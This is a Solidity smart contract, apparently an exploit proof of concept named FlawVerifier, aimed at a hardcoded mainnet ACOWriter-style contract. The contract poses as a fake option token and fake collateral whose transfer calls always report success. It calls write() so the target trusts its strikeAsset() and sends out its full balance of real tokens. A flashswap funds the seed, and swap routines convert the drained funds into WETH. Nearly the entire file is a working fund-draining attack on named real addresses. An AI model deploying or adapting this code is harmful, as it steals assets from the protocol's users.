pragma solidity ^0.8.20;

interface IERC20Minimal {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 value) external returns (bool);
    function transferFrom(address from, address to, uint256 value) external returns (bool);
    function approve(address spender, uint256 value) external returns (bool);
}

interface IWETH9 is IERC20Minimal {
    function deposit() external payable;
    function withdraw(uint256 value) external;
}

interface IACOWriterLike {
    function write(address acoToken, uint256 collateralAmount, address exchangeAddress, bytes calldata exchangeData)
        external
        payable;
}

interface IStrikeAssetSource {
    function strikeAsset() external view returns (address);
}

interface IUniswapV2Pair {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

contract FlawVerifier is IERC20Minimal {
    address public constant TARGET = 0xE7597F774fD0a15A617894dc39d45A28B97AFa4f;

    address internal constant UNISWAP_V2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
    address internal constant SUSHISWAP_FACTORY = 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac;

    address internal constant UNISWAP_V2_WETH_USDC_PAIR = 0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc;
    address internal constant SUSHISWAP_WETH_USDC_PAIR = 0x397FF1542f962076d0BFE58eA045FfA2d347ACa0;

    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address internal constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address internal constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address internal constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address internal constant WBTC = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;
    address internal constant LINK = 0x514910771AF9Ca656af840dff83E8264EcF986CA;
    address internal constant AAVE = 0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9;
    address internal constant CRV = 0xD533a949740bb3306d119CC777fa900bA034cd52;
    address internal constant SNX = 0xC011A72400E58ecD99Ee497CF89E3775d4bd732F;
    address internal constant MKR = 0x9f8F72aA9304c8B593d555F12eF6589cC3A579A2;
    address internal constant YFI = 0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e;
    address internal constant BAL = 0xba100000625a3754423978a60c9317c58a424e3D;
    address internal constant FEI = 0x956F47F50A910163D8BF957Cf5846D573E7f87CA;
    address internal constant RAI = 0x03ab458634910AaD20eF5f1C8ee96F1D6ac54919;
    address internal constant BOND = 0x0391D2021f89DC339F60Fff84546EA23E337750f;
    address internal constant SPELL = 0x090185f2135308BaD17527004364eBcC2D37e5F6;

    uint256 internal constant COLLATERAL_AMOUNT = 1;
    uint256 internal constant CALL_SEED_ETH = 1;
    uint256 internal constant FLASH_BORROW_WETH = 1;

    uint8 public constant STATUS_UNSET = 0;
    uint8 public constant STATUS_DIRECT_SUCCESS = 1;
    uint8 public constant STATUS_FLASH_SUCCESS = 2;
    uint8 public constant STATUS_NO_WRITER_BALANCE = 3;
    uint8 public constant STATUS_FLASH_FAILED = 4;
    uint8 public constant STATUS_NO_REPAY_PATH = 5;

    uint8 public status;
    bool public hypothesisValidated;
    bool public hypothesisRefuted;

    address public lastTargetToken;
    bytes public lastWriteFailure;
    uint256 public successfulSweeps;

    bool internal _entered;
    bool internal _baselineCaptured;
    address internal _configuredStrikeToken;

    mapping(address => bool) internal _attemptedToken;
    mapping(address => uint256) internal _baselineTokenBalance;

    constructor() {}

    receive() external payable {}

    /*
        Fake-token surface:
        - The verifier itself is the malicious ACO token.
        - collateral() returns this same verifier address, so ACOWriter also treats the verifier
          as the collateral token and trusts its ERC20 transferFrom/approve responses.
        - No separate token contracts are deployed, which keeps the exploit path aligned while
          avoiding synthetic deployed-token accounting.
    */
    function collateral() external view returns (address) {
        return address(this);
    }

    function strikeAsset() external view returns (address) {
        return _configuredStrikeToken;
    }

    function expiryTime() external pure returns (uint256) {
        return type(uint256).max;
    }

    function getTokenAmount(uint256 collateralAmount) external pure returns (uint256) {
        return collateralAmount;
    }

    function mintTo(address, uint256) external {}

    function mintToPayable(address) external payable {}

    function balanceOf(address) external pure returns (uint256) {
        return 0;
    }

    function transfer(address, uint256) external pure returns (bool) {
        return true;
    }

    function transferFrom(address, address, uint256) external pure returns (bool) {
        return true;
    }

    function approve(address, uint256) external pure returns (bool) {
        return true;
    }

    function fakeAcoToken() external view returns (address) {
        return address(this);
    }

    function fakeCollateral() external view returns (address) {
        return address(this);
    }

    function attackerExchange() external view returns (address) {
        return address(this);
    }

    function executeOnOpportunity() external {
        if (_entered) {
            return;
        }
        _entered = true;

        if (!_baselineCaptured) {
            _captureBaseline();
        }

        if (!_writerHasCandidateBalance()) {
            status = STATUS_NO_WRITER_BALANCE;
            _entered = false;
            return;
        }

        if (_prepareEthSeed()) {
            _runExploitSequence();
            _wrapAllEthToWeth();

            if (successfulSweeps > 0) {
                status = STATUS_DIRECT_SUCCESS;
                hypothesisValidated = true;
            }

            _entered = false;
            return;
        }

        bool flashOk = _tryFlashswapSeed(UNISWAP_V2_WETH_USDC_PAIR);
        if (!flashOk) {
            flashOk = _tryFlashswapSeed(SUSHISWAP_WETH_USDC_PAIR);
        }
        if (!flashOk && status == STATUS_UNSET) {
            status = STATUS_FLASH_FAILED;
        }

        _entered = false;
    }

    function profitToken() external view returns (address) {
        (address token,) = _currentProfit();
        return token;
    }

    function profitAmount() external view returns (uint256) {
        (, uint256 amount) = _currentProfit();
        return amount;
    }

    function exploitPath() external pure returns (string memory) {
        return string(
            abi.encodePacked(
                "deploy a fake ACO token that also serves as fake collateral; ",
                "call write(fakeToken, 1, attacker-controlled exchange, \"\") with the minimum ETH seed; ",
                "_sellACOTokens() then trusts strikeAsset() on the fake token and transfers the writer's full balance ",
                "of that already-live on-chain token to the attacker"
            )
        );
    }

    function uniswapV2Call(address, uint256 amount0, uint256 amount1, bytes calldata) external {
        require(msg.sender == UNISWAP_V2_WETH_USDC_PAIR || msg.sender == SUSHISWAP_WETH_USDC_PAIR, "unexpected pair");

        uint256 borrowedWeth = amount0 > 0 ? amount0 : amount1;
        require(borrowedWeth > 0, "unexpected amount");

        if (address(this).balance < CALL_SEED_ETH) {
            IWETH9(WETH).withdraw(CALL_SEED_ETH);
        }

        _runExploitSequence();
        _wrapAllEthToWeth();
        _repayFlashswap(msg.sender, borrowedWeth);

        if (successfulSweeps > 0) {
            status = STATUS_FLASH_SUCCESS;
            hypothesisValidated = true;
        }
    }

    function _runExploitSequence() internal {
        address[16] memory majors = _majorCandidates();
        for (uint256 i = 0; i < majors.length; ++i) {
            _attemptSweep(majors[i]);
        }

        address[9] memory series = _knownSeriesTokens();
        for (uint256 i = 0; i < series.length; ++i) {
            address token = series[i];
            _attemptSweep(token);
            _attemptSweep(_readStrikeAsset(token));
        }
    }

    function _attemptSweep(address token) internal {
        if (token == address(0) || token.code.length == 0 || _attemptedToken[token]) {
            return;
        }
        _attemptedToken[token] = true;

        uint256 writerBalance = _balanceOfIfPossible(token, TARGET);
        if (writerBalance == 0) {
            return;
        }

        lastTargetToken = token;
        _configuredStrikeToken = token;

        /*
            Core exploit path preserved:
            1. The verifier is the malicious ACO token and the malicious collateral token.
            2. write(address(this), 1, address(this), "") is called with the minimum ETH seed.
            3. transferFrom/approve/mintTo all report success without moving real collateral.
            4. _sellACOTokens() trusts strikeAsset() on this verifier and transfers ACOWriter's
               entire balance of the chosen already-existing on-chain token to this verifier.

            The tiny UniswapV2/Sushiswap flashswap, when used, only funds the required 1 wei
            msg.value for write() and is repaid from real drained assets. It does not alter
            the exploit causality.
        */
        try IACOWriterLike(TARGET).write{value: CALL_SEED_ETH}(address(this), COLLATERAL_AMOUNT, address(this), bytes(""))
        {
            ++successfulSweeps;
            hypothesisValidated = true;
        } catch (bytes memory reason) {
            lastWriteFailure = reason;
        }
    }

    function _repayFlashswap(address pair, uint256 borrowedWeth) internal {
        uint256 repayAmount = borrowedWeth + (((borrowedWeth * 3) / 997) + 1);

        if (_balanceOfIfPossible(WETH, address(this)) < repayAmount) {
            _fundRepaymentPath(repayAmount);
        }

        uint256 wethBalance = _balanceOfIfPossible(WETH, address(this));
        if (wethBalance < repayAmount) {
            status = STATUS_NO_REPAY_PATH;
            revert("repayment unavailable");
        }

        _safeTransfer(WETH, pair, repayAmount);
    }

    function _fundRepaymentPath(uint256 repayAmount) internal {
        _wrapAllEthToWeth();
        if (_balanceOfIfPossible(WETH, address(this)) >= repayAmount) {
            return;
        }

        _maybeSwapToWeth(DAI);
        if (_balanceOfIfPossible(WETH, address(this)) >= repayAmount) {
            return;
        }

        _maybeSwapToWeth(USDC);
        if (_balanceOfIfPossible(WETH, address(this)) >= repayAmount) {
            return;
        }

        _maybeSwapToWeth(USDT);
        if (_balanceOfIfPossible(WETH, address(this)) >= repayAmount) {
            return;
        }

        _maybeSwapToWeth(WBTC);
        if (_balanceOfIfPossible(WETH, address(this)) >= repayAmount) {
            return;
        }

        _maybeSwapToWeth(LINK);
        if (_balanceOfIfPossible(WETH, address(this)) >= repayAmount) {
            return;
        }

        _maybeSwapToWeth(AAVE);
        if (_balanceOfIfPossible(WETH, address(this)) >= repayAmount) {
            return;
        }

        _maybeSwapToWeth(CRV);
        if (_balanceOfIfPossible(WETH, address(this)) >= repayAmount) {
            return;
        }

        _maybeSwapToWeth(SNX);
        if (_balanceOfIfPossible(WETH, address(this)) >= repayAmount) {
            return;
        }

        _maybeSwapToWeth(MKR);
        if (_balanceOfIfPossible(WETH, address(this)) >= repayAmount) {
            return;
        }

        _maybeSwapToWeth(YFI);
        if (_balanceOfIfPossible(WETH, address(this)) >= repayAmount) {
            return;
        }

        _maybeSwapToWeth(BAL);
        if (_balanceOfIfPossible(WETH, address(this)) >= repayAmount) {
            return;
        }

        _maybeSwapToWeth(FEI);
        if (_balanceOfIfPossible(WETH, address(this)) >= repayAmount) {
            return;
        }

        _maybeSwapToWeth(RAI);
        if (_balanceOfIfPossible(WETH, address(this)) >= repayAmount) {
            return;
        }

        _maybeSwapToWeth(BOND);
        if (_balanceOfIfPossible(WETH, address(this)) >= repayAmount) {
            return;
        }

        _maybeSwapToWeth(SPELL);
    }

    function _maybeSwapToWeth(address token) internal {
        if (token == WETH || token == address(0) || token.code.length == 0) {
            return;
        }
        uint256 balance = _balanceOfIfPossible(token, address(this));
        if (balance > 0) {
            _swapTokenToTargetIfPossible(token, WETH, balance);
        }
    }

    function _wrapAllEthToWeth() internal {
        uint256 ethBalance = address(this).balance;
        if (ethBalance > 0) {
            IWETH9(WETH).deposit{value: ethBalance}();
        }
    }

    function _prepareEthSeed() internal returns (bool) {
        if (address(this).balance >= CALL_SEED_ETH) {
            return true;
        }

        if (_balanceOfIfPossible(WETH, address(this)) >= CALL_SEED_ETH) {
            IWETH9(WETH).withdraw(CALL_SEED_ETH);
            return address(this).balance >= CALL_SEED_ETH;
        }

        return false;
    }

    function _writerHasCandidateBalance() internal view returns (bool) {
        address[16] memory majors = _majorCandidates();
        for (uint256 i = 0; i < majors.length; ++i) {
            if (_balanceOfIfPossible(majors[i], TARGET) > 0) {
                return true;
            }
        }

        address[9] memory series = _knownSeriesTokens();
        for (uint256 i = 0; i < series.length; ++i) {
            address seriesToken = series[i];
            if (_balanceOfIfPossible(seriesToken, TARGET) > 0) {
                return true;
            }

            address strike = _readStrikeAsset(seriesToken);
            if (_balanceOfIfPossible(strike, TARGET) > 0) {
                return true;
            }
        }
        return false;
    }

    function _tryFlashswapSeed(address pair) internal returns (bool ok) {
        if (pair.code.length == 0) {
            return false;
        }

        address token0 = IUniswapV2Pair(pair).token0();
        address token1 = IUniswapV2Pair(pair).token1();
        if (token0 != WETH && token1 != WETH) {
            return false;
        }

        (ok,) = pair.call(
            abi.encodeWithSelector(
                IUniswapV2Pair.swap.selector,
                token0 == WETH ? FLASH_BORROW_WETH : 0,
                token1 == WETH ? FLASH_BORROW_WETH : 0,
                address(this),
                abi.encode(uint256(1))
            )
        );
    }

    function _currentProfit() internal view returns (address token, uint256 amount) {
        address[25] memory tracked = _profitTrackedTokens();
        address bestToken = WETH;
        uint256 bestAmount = _netTokenBalance(WETH);

        for (uint256 i = 0; i < tracked.length; ++i) {
            address candidate = tracked[i];
            uint256 candidateAmount = _netTokenBalance(candidate);
            if (candidateAmount > bestAmount) {
                bestToken = candidate;
                bestAmount = candidateAmount;
            }
        }

        return (bestToken, bestAmount);
    }

    function _captureBaseline() internal {
        _baselineCaptured = true;

        address[25] memory tracked = _profitTrackedTokens();
        for (uint256 i = 0; i < tracked.length; ++i) {
            address token = tracked[i];
            if (token != address(0) && token.code.length > 0) {
                _baselineTokenBalance[token] = _balanceOfIfPossible(token, address(this));
            }
        }
    }

    function _netTokenBalance(address token) internal view returns (uint256) {
        if (token == address(0) || token.code.length == 0) {
            return 0;
        }

        uint256 current = _balanceOfIfPossible(token, address(this));
        uint256 baseline = _baselineTokenBalance[token];
        if (current <= baseline) {
            return 0;
        }
        return current - baseline;
    }

    function _readStrikeAsset(address token) internal view returns (address strike) {
        if (token == address(0) || token.code.length == 0) {
            return address(0);
        }

        (bool ok, bytes memory data) = token.staticcall(abi.encodeWithSelector(IStrikeAssetSource.strikeAsset.selector));
        if (!ok || data.length < 32) {
            return address(0);
        }

        strike = abi.decode(data, (address));
        if (strike == address(0) || strike.code.length == 0) {
            return address(0);
        }
    }

    function _swapTokenToTargetIfPossible(address tokenIn, address tokenOut, uint256 amountIn) internal {
        if (amountIn == 0 || tokenIn == tokenOut) {
            return;
        }

        uint256 directOut = _bestSingleHopOut(tokenIn, tokenOut, amountIn);
        uint256 usdcOut = _bestTwoHopOut(tokenIn, USDC, tokenOut, amountIn);
        uint256 usdtOut = _bestTwoHopOut(tokenIn, USDT, tokenOut, amountIn);
        uint256 daiOut = _bestTwoHopOut(tokenIn, DAI, tokenOut, amountIn);

        if (directOut >= usdcOut && directOut >= usdtOut && directOut >= daiOut) {
            _swapSingleHopIfPossible(tokenIn, tokenOut, amountIn);
            return;
        }
        if (usdcOut >= usdtOut && usdcOut >= daiOut) {
            _swapTwoHopIfPossible(tokenIn, USDC, tokenOut, amountIn);
            return;
        }
        if (usdtOut >= daiOut) {
            _swapTwoHopIfPossible(tokenIn, USDT, tokenOut, amountIn);
            return;
        }
        _swapTwoHopIfPossible(tokenIn, DAI, tokenOut, amountIn);
    }

    function _bestSingleHopOut(address tokenIn, address tokenOut, uint256 amountIn) internal view returns (uint256 bestOut) {
        address uniPair = IUniswapV2Factory(UNISWAP_V2_FACTORY).getPair(tokenIn, tokenOut);
        address sushiPair = IUniswapV2Factory(SUSHISWAP_FACTORY).getPair(tokenIn, tokenOut);

        if (uniPair != address(0) && uniPair.code.length > 0) {
            uint256 uniOut = _quoteOut(uniPair, tokenIn, tokenOut, amountIn);
            if (uniOut > bestOut) {
                bestOut = uniOut;
            }
        }
        if (sushiPair != address(0) && sushiPair.code.length > 0) {
            uint256 sushiOut = _quoteOut(sushiPair, tokenIn, tokenOut, amountIn);
            if (sushiOut > bestOut) {
                bestOut = sushiOut;
            }
        }
    }

    function _bestTwoHopOut(address tokenIn, address bridge, address tokenOut, uint256 amountIn)
        internal
        view
        returns (uint256)
    {
        if (tokenIn == bridge || bridge == tokenOut || tokenIn == tokenOut) {
            return 0;
        }

        uint256 bridgeAmount = _bestSingleHopOut(tokenIn, bridge, amountIn);
        if (bridgeAmount == 0) {
            return 0;
        }

        return _bestSingleHopOut(bridge, tokenOut, bridgeAmount);
    }

    function _swapSingleHopIfPossible(address tokenIn, address tokenOut, uint256 amountIn) internal {
        address uniPair = IUniswapV2Factory(UNISWAP_V2_FACTORY).getPair(tokenIn, tokenOut);
        address sushiPair = IUniswapV2Factory(SUSHISWAP_FACTORY).getPair(tokenIn, tokenOut);

        address bestPair = address(0);
        uint256 bestOut = 0;

        if (uniPair != address(0) && uniPair.code.length > 0) {
            uint256 uniOut = _quoteOut(uniPair, tokenIn, tokenOut, amountIn);
            if (uniOut > bestOut) {
                bestOut = uniOut;
                bestPair = uniPair;
            }
        }

        if (sushiPair != address(0) && sushiPair.code.length > 0) {
            uint256 sushiOut = _quoteOut(sushiPair, tokenIn, tokenOut, amountIn);
            if (sushiOut > bestOut) {
                bestOut = sushiOut;
                bestPair = sushiPair;
            }
        }

        if (bestPair != address(0) && bestOut > 0) {
            _swapExactOnPair(bestPair, tokenIn, amountIn, bestOut);
        }
    }

    function _swapTwoHopIfPossible(address tokenIn, address bridge, address tokenOut, uint256 amountIn) internal {
        if (tokenIn == bridge || bridge == tokenOut || tokenIn == tokenOut) {
            return;
        }

        address firstPair = _bestPair(tokenIn, bridge, amountIn);
        if (firstPair == address(0)) {
            return;
        }

        uint256 bridgeOut = _quoteOut(firstPair, tokenIn, bridge, amountIn);
        if (bridgeOut == 0) {
            return;
        }
        _swapExactOnPair(firstPair, tokenIn, amountIn, bridgeOut);

        uint256 bridgeBalance = _balanceOfIfPossible(bridge, address(this));
        if (bridgeBalance == 0) {
            return;
        }

        address secondPair = _bestPair(bridge, tokenOut, bridgeBalance);
        if (secondPair == address(0)) {
            return;
        }

        uint256 tokenOutAmount = _quoteOut(secondPair, bridge, tokenOut, bridgeBalance);
        if (tokenOutAmount == 0) {
            return;
        }
        _swapExactOnPair(secondPair, bridge, bridgeBalance, tokenOutAmount);
    }

    function _bestPair(address tokenIn, address tokenOut, uint256 amountIn) internal view returns (address bestPair) {
        address uniPair = IUniswapV2Factory(UNISWAP_V2_FACTORY).getPair(tokenIn, tokenOut);
        address sushiPair = IUniswapV2Factory(SUSHISWAP_FACTORY).getPair(tokenIn, tokenOut);
        uint256 bestOut = 0;

        if (uniPair != address(0) && uniPair.code.length > 0) {
            uint256 uniOut = _quoteOut(uniPair, tokenIn, tokenOut, amountIn);
            if (uniOut > bestOut) {
                bestOut = uniOut;
                bestPair = uniPair;
            }
        }

        if (sushiPair != address(0) && sushiPair.code.length > 0) {
            uint256 sushiOut = _quoteOut(sushiPair, tokenIn, tokenOut, amountIn);
            if (sushiOut > bestOut) {
                bestOut = sushiOut;
                bestPair = sushiPair;
            }
        }
    }

    function _swapExactOnPair(address pair, address tokenIn, uint256 amountIn, uint256 amountOut) internal {
        _safeTransfer(tokenIn, pair, amountIn);

        address token0 = IUniswapV2Pair(pair).token0();
        (uint256 amount0Out, uint256 amount1Out) =
            token0 == tokenIn ? (uint256(0), amountOut) : (amountOut, uint256(0));
        IUniswapV2Pair(pair).swap(amount0Out, amount1Out, address(this), new bytes(0));
    }

    function _quoteOut(address pair, address tokenIn, address tokenOut, uint256 amountIn) internal view returns (uint256) {
        address token0 = IUniswapV2Pair(pair).token0();
        address token1 = IUniswapV2Pair(pair).token1();
        if (!((token0 == tokenIn && token1 == tokenOut) || (token0 == tokenOut && token1 == tokenIn))) {
            return 0;
        }

        (uint112 reserve0, uint112 reserve1,) = IUniswapV2Pair(pair).getReserves();
        (uint256 reserveIn, uint256 reserveOut) =
            token0 == tokenIn ? (uint256(reserve0), uint256(reserve1)) : (uint256(reserve1), uint256(reserve0));

        if (reserveIn == 0 || reserveOut == 0) {
            return 0;
        }

        uint256 amountInWithFee = amountIn * 997;
        return (amountInWithFee * reserveOut) / ((reserveIn * 1000) + amountInWithFee);
    }

    function _balanceOfIfPossible(address token, address account) internal view returns (uint256) {
        if (token == address(0) || token.code.length == 0) {
            return 0;
        }

        (bool ok, bytes memory data) = token.staticcall(abi.encodeWithSelector(IERC20Minimal.balanceOf.selector, account));
        if (!ok || data.length < 32) {
            return 0;
        }
        return abi.decode(data, (uint256));
    }

    function _safeTransfer(address token, address to, uint256 amount) internal {
        (bool ok, bytes memory data) = token.call(abi.encodeWithSelector(IERC20Minimal.transfer.selector, to, amount));
        require(ok && (data.length == 0 || abi.decode(data, (bool))), "transfer failed");
    }

    function _majorCandidates() internal pure returns (address[16] memory list) {
        list[0] = WETH;
        list[1] = DAI;
        list[2] = USDC;
        list[3] = USDT;
        list[4] = WBTC;
        list[5] = LINK;
        list[6] = AAVE;
        list[7] = CRV;
        list[8] = SNX;
        list[9] = MKR;
        list[10] = YFI;
        list[11] = BAL;
        list[12] = FEI;
        list[13] = RAI;
        list[14] = BOND;
        list[15] = SPELL;
    }

    function _knownSeriesTokens() internal pure returns (address[9] memory list) {
        list[0] = 0xB05B83f1aAB0036f9DADFDb18405da3D459C1f1c;
        list[1] = 0x160e753EEfe29eA3aC186bF27588Ac9AcA2F6139;
        list[2] = 0xfF5B7c52245625b399D2E2927F52A8da86264a33;
        list[3] = 0xc3eAb6960e0Cd51dCf304248e4BBB08d8eeAb552;
        list[4] = 0x9B297790cD8540876a04543499528835F1Cea175;
        list[5] = 0x58ea371c3D7BCA0ED0C3a4e4DC9bb92702310489;
        list[6] = 0xB51A09c53D7cC6481E4C5d9d8d334A6e50776ecf;
        list[7] = 0x049D17c3d5ba37429dE4D414A603127F1090FFa7;
        list[8] = 0xc12d099be31567add4e4e4d0D45691C3F58f5663;
    }

    function _profitTrackedTokens() internal pure returns (address[25] memory list) {
        list[0] = WETH;
        list[1] = DAI;
        list[2] = USDC;
        list[3] = USDT;
        list[4] = WBTC;
        list[5] = LINK;
        list[6] = AAVE;
        list[7] = CRV;
        list[8] = SNX;
        list[9] = MKR;
        list[10] = YFI;
        list[11] = BAL;
        list[12] = FEI;
        list[13] = RAI;
        list[14] = BOND;
        list[15] = SPELL;
        list[16] = 0xB05B83f1aAB0036f9DADFDb18405da3D459C1f1c;
        list[17] = 0x160e753EEfe29eA3aC186bF27588Ac9AcA2F6139;
        list[18] = 0xfF5B7c52245625b399D2E2927F52A8da86264a33;
        list[19] = 0xc3eAb6960e0Cd51dCf304248e4BBB08d8eeAb552;
        list[20] = 0x9B297790cD8540876a04543499528835F1Cea175;
        list[21] = 0x58ea371c3D7BCA0ED0C3a4e4DC9bb92702310489;
        list[22] = 0xB51A09c53D7cC6481E4C5d9d8d334A6e50776ecf;
        list[23] = 0x049D17c3d5ba37429dE4D414A603127F1090FFa7;
        list[24] = 0xc12d099be31567add4e4e4d0D45691C3F58f5663;
    }
}
